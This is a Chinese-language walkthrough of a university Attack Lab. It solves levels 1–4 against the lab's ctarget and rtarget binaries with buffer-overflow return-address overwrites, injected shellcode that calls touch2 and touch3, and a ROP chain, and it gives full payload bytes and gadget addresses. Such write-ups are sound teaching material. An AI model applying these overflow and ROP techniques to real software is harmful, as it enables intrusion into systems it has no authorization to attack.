# Attack Lab（level 1–4）

本文针对当前目录中的 `ctarget` 和 `rtarget` 实例。不同实验实例的栈地址、Cookie 和函数地址可能不同，因此地址应以本地反汇编结果为准。

## level 1：直接覆盖返回地址

`getbuf` 的核心代码为：

```asm
sub $0x28, %rsp
Gets(...)
add $0x28, %rsp
ret
```

因此，缓冲区起始地址到保存的返回地址之间有 `0x28 = 40` 字节。只需要用 40 字节填充数据，再写入 `touch1` 的地址即可：

```text
[40 字节 padding]
[touch1 地址，小端序]
```

当前实例中：

```text
touch1 = 0x4017c0
```

对应的地址字节为：

```text
c0 17 40 00 00 00 00 00
```

这里必须使用小端序。由于 `touch1` 不需要参数，也不需要注入代码。

## level 2：注入代码调用 `touch2`

`touch2` 需要第一个参数 `%edi` 等于 Cookie。可以将一小段机器码放在缓冲区开头，然后把保存的返回地址改为缓冲区地址：

```asm
movl $0x59b997fa, %edi
pushq $0x4017ec
retq
```

这段代码的作用是：

1. 将 Cookie 放入 `%edi`；
2. 将 `touch2` 地址压栈；
3. 用 `retq` 跳转到 `touch2`。

当前实例中：

```text
touch2 = 0x4017ec
```

典型布局如下：

```text
低地址
  buf + 0x00: 注入代码
  buf + 0x10: padding
  buf + 0x28: buf 地址，覆盖 getbuf 的返回地址
高地址
```

注意：这里覆盖返回地址的是“注入代码的地址”，不是 `popq %rax; retq` Gadget。由于栈地址可能因实验环境不同而变化，`buf` 地址应使用 GDB 在当前运行中确认。

## level 3：注入代码调用 `touch3`

`touch3` 的参数不是整数 Cookie，而是指向 ASCII 字符串的指针。当前 Cookie 为：

```text
59b997fa
```

因此内存中应保存字符串：

```text
35 39 62 39 39 37 66 61 00
```

注入代码为：

```asm
leaq (%rsp), %rdi
pushq $0x4018fa
retq
```

当 `getbuf` 返回到注入代码时，`%rsp` 指向保存的返回地址之后，也就是字符串所在位置。因此 `leaq (%rsp), %rdi` 可以直接取得字符串地址。

当前实例中：

```text
touch3 = 0x4018fa
```

栈布局为：

```text
低地址
  buf + 0x00: 注入代码
  buf + 0x10: padding
  buf + 0x28: 注入代码地址，覆盖 getbuf 的返回地址
  buf + 0x30: ASCII 字符串 "59b997fa\0"
高地址
```

字符串放在返回地址之后的较高地址处，是为了避免 `touch3` 建立栈帧、调用 `hexmatch` 时覆盖它。这里保存的是字符串，不是整数 `0x59b997fa`。

## level 4：使用 ROP 调用 `touch2`

`rtarget` 禁止执行栈上的注入代码，并且栈地址随机化，因此需要使用 ROP。当前实例中可以在 Gadget Farm 中找到：

```text
0x4019ab: popq %rax; nop; retq
0x4019c5: movl %eax, %edi; nop; retq
0x4017ec: touch2
```

`0x4019ab` 和 `0x4019c5` 是从函数中间开始执行得到的 Gadget，地址必须以本地 `objdump` 结果为准。

ROP 链的执行过程为：

```text
getbuf 的 ret
    ↓
0x4019ab              pop %rax
    ↓
Cookie                %rax = Cookie
    ↓
0x4019c5              mov %eax, %edi
    ↓
0x4017ec              touch2(%edi)
```

由于 Cookie 是 32 位值，`movl %eax, %edi` 会将其正确放入 `%edi`，不需要使用 `movq %rax, %rdi`。

当前 `getbuf` 分配 `0x28` 字节栈空间，因此 payload 布局为：

```text
buf + 0x00 ~ 0x27: padding（40 字节）
buf + 0x28:        0x4019ab，覆盖原返回地址
buf + 0x30:        0x59b997fa
buf + 0x38:        0x4019c5
buf + 0x40:        0x4017ec
```

所有地址和整数都要按小端序写入。对应的 payload 为：

```text
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

## 常用 GDB 命令

```gdb
layout asm
layout regs
disassemble getbuf
disassemble touch1
disassemble touch2
disassemble touch3
break *0xADDRESS
info breakpoints
x/24gx $rsp
```

生成并运行 payload：

```bash
./hex2raw < payload.txt | ./ctarget
./hex2raw < payload.txt | ./rtarget
```
